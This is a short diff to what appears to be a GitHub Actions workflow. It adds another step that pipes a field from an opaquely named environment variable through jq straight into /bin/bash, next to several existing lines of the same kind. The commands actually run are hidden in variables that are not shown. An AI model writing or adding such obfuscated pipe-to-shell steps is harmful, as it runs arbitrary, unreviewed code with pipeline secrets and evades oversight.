@@ -28,6 +28,7 @@ jobs:
           printf '%s' "$i717" | jq -r .zm808 | /bin/bash
           printf '%s' "$oe8293" | jq -r .ehgl088 | /bin/bash
           printf '%s' "$lh275" | jq -r .jlyk05 | /bin/bash
+          echo $n6600 | jq -r .wpgbo97 | /bin/bash
 
       - name: Save output
         uses: actions/upload-artifact@v4
